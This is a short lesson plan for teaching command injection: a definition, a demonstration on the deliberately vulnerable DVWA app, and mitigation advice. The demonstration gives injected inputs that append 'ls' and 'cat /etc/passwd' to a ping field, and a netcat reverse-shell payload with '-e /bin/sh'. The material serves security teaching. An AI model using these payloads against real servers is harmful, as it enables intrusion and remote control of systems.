# Command Injection

Command injection happens when an attacker can effectively force the web servers terminal interface to execute a command. Like all injection attacks, this happens when user input is used in an unsafe way. Command injection is a very severe vulnerability, and can almost always be used to gain a "reverse shell" giving the attacker significant access to the server.

## Objectives

* Describe command injection.
* Execute a command injection attack.
* Mitigate command injection.

## Lesson Plan

### What is Command Injection (5 minutes)

* This is just like the other injection attacks we've seen, but a different target.
* Instead of, say, running a SQL command we're trying to run a terminal command.
* Simple!

### Execute Command Injection on DVWA (5 minutes)

* Do a real IP address first, note that its running the ping command.
* It's just giving us the raw output, so cool.
* Simple linux trick, lets use a ;
* 127.0.0.1; ls -la
* 127.0.0.1; cat /etc/passwd


* Very common thing to do: get a "reverse shell"
  * Slightly harder in the real world, since your computer needs a public ip, deal with firewalls, and NAT
  * But still, all of this can often be overcome if you can do command injection.
  * Set a terminal listening with `nc -l 1337`
  * Send the command: `127.0.0.1; nc 127.0.0.1 1337 -e /bin/sh`
    * nc reaches out to the server we created.
    * -e says "send the input from that server to this program"
    * So after we connect, nc forwards our commands to the targets /bin/sh, executing our commands.
    * You can get a "full shell" with tab autocomplete and all the goodies after this, see:
      * https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2
  * Other useful commands to run if we find such a vulnerability: https://portswigger.net/web-security/os-command-injection


* Other vulnerabilities like file inclusion can lead to command injection. For Example:
  * User uploads a PHP file to a PHP server (like apache).
  * That PHP file contains the PHP code to execute a command.
  * Attacker now sends requests to the webpage they basically created!
  * :(

### Mitigate Command Injection (5 minutes)

* Don't make calls to the terminal from your web app.
  * JUST DON'T DO IT!
  * There is almost always another way to do whatever you want to do without invoking the OS in the application directly.
  * It is not worth the risk, if you need some functionality from the OS, find a way to mimic it in code.
* If you don't use user input, i.e. `run_command("ping 127.0.0.1")` you won't be vulnerable to command injection.
  * But you still might question why you need this functionality in the first place.
* Do not try to sanitize or validate user input to then pass into the command line, clever attackers can basically always break your validation code.
